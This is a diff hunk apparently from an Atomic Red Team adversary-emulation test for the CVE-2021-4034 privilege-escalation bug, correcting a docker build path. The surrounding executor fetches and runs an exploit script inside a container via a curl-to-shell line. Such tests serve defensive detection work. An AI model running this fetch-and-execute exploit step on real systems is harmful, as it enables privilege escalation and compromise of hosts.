@@ -27,7 +27,7 @@ atomic_tests:
       sudo systemctl start docker
   executor:
     command: |-
-      docker build -t cve_2021_4034  /root/AtomicRedTeam/T1068/src/
+      docker build -t cve_2021_4034  /root/AtomicRedTeam/atomics/T1068/src/
       docker run --name CVE_2021_4034_container  -d -t cve_2021_4034
       docker exec CVE_2021_4034_container /bin/sh -c "$(curl -fsSL #{exploit_url})"
     cleanup_command: |-
